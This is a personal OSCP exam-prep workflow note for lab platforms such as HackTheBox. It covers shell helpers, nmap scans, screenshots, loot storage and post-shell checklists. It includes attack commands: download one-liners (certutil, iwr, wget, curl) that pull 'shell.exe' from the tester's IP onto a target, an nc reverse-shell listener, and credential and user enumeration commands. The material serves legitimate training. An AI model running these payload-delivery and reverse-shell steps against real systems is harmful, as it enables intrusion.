# OSCP Habits — Screenshot & Loot

*The discipline that separates a clean report from a scramble at the end.*

---

## Pre-Engagement Setup

All shell functions live in `~/.zshrc`, no manual exports needed. Run `source ~/.zshrc` once per terminal session if they're not loading.

### Quick reference — all box functions

| Command | What it does |
|---|---|
| `boxstart <Name> <IP> [htb\|offsec\|thm]` | First time on a box — creates dirs in `~/Platforms/`, writes `.env`, starts log |
| `boxload [Name]` | Reconnect in new terminal — sources vars, stamps log (auto-runs on terminal open if marker exists) |
| `boxdone` | Clear current-box marker + unset all vars |
| `boxset <VAR> <value>` | Update a variable live + save to `.env` |
| `loot cred <user> <pass>` | Save credential → `loot/creds.txt` |
| `loot hash <user> <hash>` | Save hash → `loot/hashes.txt` |
| `loot flag <user\|root> <value>` | Save flag → `loot/flags.txt` |
| `loot key <path>` | Copy SSH key → `loot/` (chmod 600) |
| `loot file <path>` | Copy any file → `loot/` |
| `shot <name>` | Screenshot → `screenshots/<name>.png` |
| `www [port]` | HTTP server from `www/` dir (default :80) |
| `transfer <file> [port]` | Copy file to `www/`, print download one-liners, start server |
| `listener [port]` | `nc -lnvp` on `$Port` (default 4444) |
| `nocolor <command>` | Strip ANSI codes from any tool's output |
| `proof linux\|windows` | Print proof screenshot command to paste into target shell |

---

### First time on a new box

```bash
boxstart <BoxName> <BoxIP> [htb|offsec|thm]
```

Example:
```bash
boxstart Sea 10.10.11.28 htb
```

Platform shortcuts: `htb` = HackTheBox, `offsec` = Offsec, `thm` = TryHackMe. Defaults to `htb` if omitted.

This does everything in one shot:
- Creates `~/Platforms/HackTheBox/Sea/{nmap,loot,exploits,screenshots,www}/`
- Writes all variables to `~/Platforms/HackTheBox/Sea/.env` (includes `BoxDir`, `BoxPlatform`)
- Sources the `.env` immediately (all vars live in the current terminal)
- `cd`s into the box directory
- Writes `~/.current_box` so any new terminal auto-loads this box
- Writes session start marker to `Sea.log`
- Prints `LocalIP` so you can confirm VPN is up

### New terminal (same box, reconnecting)

```bash
boxload [BoxName]
```

Sources `.env`, cds into the directory, stamps the log, refreshes `LocalIP` from `tun0`.

**Auto-load:** if `~/.current_box` exists (written by `boxstart`/`boxload`), any new interactive terminal will auto-run `boxload` without typing anything. You'll see `[auto] box: Sea` on open.

**Manual override:** `boxload Sea` always works and searches `~/Platforms/` across all platform directories.

### Clearing a box session

```bash
boxdone
```

Deletes `~/.current_box` and unsets all box vars. New terminals will no longer auto-load. Run this when you're done with a box.

### Updating a variable when you find creds or a new port

```bash
boxset Username john
boxset Password Password123!
boxset Port 9001
```

Updates live in current terminal AND saves to `.env`, every future `boxload` picks it up.

> 📸 **Screenshot: terminal after `boxstart` or `boxload` confirming BoxIP and LocalIP**

### Manual override (edge case)

```bash
nano $BoxDir/.env
source $BoxDir/.env
```

---

## New Box Checklist (copy-paste in order)

> Run these steps at the start of every box, in this order.

**1 — Load functions (only needed once per terminal session)**
```bash
source ~/.zshrc
```

**2 — Spin up the box**
```bash
boxstart <BoxName> <BoxIP> [htb|offsec|thm]
```
Creates dirs, writes `.env`, exports all vars, cds into `~/Platforms/<Platform>/<BoxName>/`. Confirm `LocalIP` is shown and correct (VPN must be up).

**3 — Command logging is automatic**

`preexec` in `.zshrc` stamps every command as `$ <command>` into `$BoxDir/$BoxName.log` before it runs. No manual step needed, as long as `BoxName` and `BoxDir` are set (done by `boxstart`/`boxload`), commands are logged.

> **Why not `script`?** `script` captures the PTY stream, which embeds your zsh prompt's escape sequences around every typed character. Cleaning those sequences destroys the command text. `preexec` writes directly to the file, bypassing the PTY, so commands land cleanly.

**Optional: capture raw output too**
```bash
script -a $BoxName.log
```
If you want tool output in the log as well as commands, run this. Be aware: the log will need ANSI stripping afterwards (`ansifilter -i $BoxName.log -o $BoxName.log`). For most purposes, screenshots cover output, the log is primarily for command history.

**4 — Full TCP port scan**
```bash
nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
```

**5 — UDP scan (open a second terminal, run in parallel)**
```bash
# New terminal auto-loads the box — just run the scan
nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
```

**6 — Service scan (paste the open ports from step 4)**
```bash
nmap -sC -sV -p <ports> -oA nmap/${BoxName}_services $BoxIP
```

> 📸 Screenshot: full port scan output
> 📸 Screenshot: service scan output

---

## Mid-Box: New Terminal

New terminal auto-loads the current box from `~/.current_box` — no command needed. You'll see `[auto] box: <Name>` on open.

If auto-load didn't fire (no marker, or you're in a non-interactive shell):
```bash
boxload <BoxName>
```

All vars restored, cds into the box dir, `LocalIP` refreshed from `tun0`.

---

## Mid-Box: Found Creds or New Info

```bash
boxset Username admin
boxset Password S3cr3t!
boxset Port 9001
```

Saves to `.env` so every future `boxload` has the latest values.

---

## Screenshot Checklist

Use `shot <name>`, auto-saves to `screenshots/` with the right filename. Take it **before moving on**.

| Moment | `shot` command | What to capture |
|--------|---------------|-----------------|
| Full port scan | `shot nmap-allports` | All open ports visible |
| Service scan | `shot nmap-services` | Versions + script output |
| Significant finding | `shot <service>-<finding>` e.g. `shot smb-null-session` | The discovery in context |
| Foothold gained | `shot foothold` | `whoami` + `id` + `hostname` in shell |
| User flag | `shot user-flag` | `cat local.txt` output |
| PrivEsc discovery | `shot privesc-finding` | The vulnerable thing you found |
| PrivEsc execution | `shot privesc-exploit` | The command that elevated you |
| Root shell | `shot root-shell` | `whoami` → `root` or `nt authority\system` |
| Root flag | `shot root-flag` | `cat proof.txt` output |
| OSCP proof | `shot PROOF` | `whoami` + `hostname` + flag in one frame |

> 🔧 Before the proof shot: run `proof linux` or `proof windows`, it prints the exact command to paste into the target shell. Screenshot the output.

> 🔧 The OSCP exam proof screenshot needs all three visible at once: whoami, hostname/ipconfig, and the flag.

---

## Loot Storage

Store loot **immediately** on finding it. Don't trust your terminal history. Use `loot`, one command, no thinking.

```bash
loot cred $Username $Password        # → loot/creds.txt
loot hash $Username $Hash            # → loot/hashes.txt
loot flag user <value>               # → loot/flags.txt
loot flag root <value>               # → loot/flags.txt
loot key /path/to/id_rsa             # → loot/ (chmod 600 auto-applied)
loot file /path/to/interesting.conf  # → loot/
```

Save creds to `.env` at the same time so you can use them in commands:
```bash
boxset Username john
boxset Password Password123!
loot cred $Username $Password
```

---

## File Transfers to Target

**One-command delivery:** `transfer` copies the file to `www/`, prints all download one-liners, and starts the HTTP server.

```bash
transfer exploits/shell.exe        # serves on :80
transfer exploits/shell.exe 8080   # serves on :8080
```

Output you get:
```
URL:         http://$LocalIP:80/shell.exe

PowerShell:  iwr http://$LocalIP:80/shell.exe -o shell.exe
certutil:    certutil -urlcache -split -f http://$LocalIP:80/shell.exe shell.exe
wget:        wget http://$LocalIP:80/shell.exe
curl:        curl http://$LocalIP:80/shell.exe -o shell.exe
```

Copy the right one-liner, paste into the target shell. Ctrl+C the server when done.

**Manual:** drop files into `$BoxDir/www/` and run `www` to start the server.

**Listener (reverse shells):**
```bash
listener          # nc -lnvp $Port (default 4444)
listener 9001     # nc -lnvp 9001
```

---

## During Enumeration — What to Note Down

Keep a running scratch note (`$BoxDir/notes.md`) with:
- Open ports and services (copy from nmap output)
- Software versions and anything searchsploit-able
- Usernames found anywhere (files, headers, comments, web pages)
- Passwords found anywhere, even partial ones or hints
- Any internal hostnames or IPs seen
- Any paths that look interesting but you haven't explored yet
- What you tried that didn't work (prevents circling back)

---

## When You Get a Shell — Immediate Checklist

**Linux shell:**
```bash
# 1. Upgrade it first — before doing anything else
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# 2. Confirm your identity
whoami && id && hostname && ip a

# 3. Screenshot (foothold-whoami.png)

# 4. Quick orientation
uname -a
cat /etc/os-release
cat /etc/passwd | grep -v nologin
```

**Windows shell:**
```cmd
REM 1. Confirm identity
whoami /all
hostname
ipconfig

REM 2. Screenshot

REM 3. Quick orientation  
systeminfo
net user
net localgroup administrators
```

---

## End of Box — Pre-Report Checklist

Before writing the report, verify you have:
- [ ] All screenshots named and in `$BoxDir/screenshots/`
- [ ] All flags recorded in `loot/flags.txt`
- [ ] All creds recorded in `loot/creds.txt`
- [ ] The OSCP proof screenshot, run `proof linux|windows`, paste into target shell, `shot PROOF`
- [ ] The attack path clear in your head: how did you get from "open ports" to "root"?

**Knowledge gaps resolved — every technique must trace back:**
- [ ] Every stage note row has a wikilink to its module note or hub doc section
- [ ] Any technique not in the OSCP structure has been written into the right place (module note, HTB supplementary, hub doc), not just flagged, actually written
- [ ] Tags are consistent between the stage note and the linked module/hub doc
- [ ] If a new tool was used → entry added to Modern Tooling
- [ ] If a command is worth a breakdown → added to the relevant Command Breakdowns file

Then copy [[Box Report Template]] and fill it in while it's fresh.

---

## Module Cross-Reference

When you hit a technique on a box, these modules have the detail:

| Area | Module |
|------|--------|
| Recon / enumeration | [[06. Information Gathering|Information Gathering]], [[07. Vulnerability Scanning|Vulnerability Scanning]] |
| Web app attacks | [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]], [[09. Common Web Application Attacks|Common Web Application Attacks]] |
| SQLi | [[10. SQL Injection Attacks|SQL Injection Attacks]] |
| File/client attacks | [[12. Client-Side Attacks|Client-Side Attacks]] |
| Public exploits | [[13. Locating Public Exploits|Locating Public Exploits]], [[14. Fixing Exploits|Fixing Exploits]] |
| AV evasion | [[15. Antivirus Evasion|Antivirus Evasion]] |
| Passwords / hashes | [[16. Password Attacks|Password Attacks]] |
| Linux privesc | [[18. Linux Privilege Escalation|Linux Privilege Escalation]] |
| Windows privesc | [[17. Windows Privilege Escalation|Windows Privilege Escalation]] |
| Pivoting | [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]], [[20. Tunneling Through Deep Packet Inspection|Tunneling Through Deep Packet Inspection]] |
| Active Directory | [[22. Active Directory Introduction and Enumeration|Active Directory Introduction and Enumeration]], [[23. Attacking Active Directory Authentication|Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory|Lateral Movement in Active Directory]] |
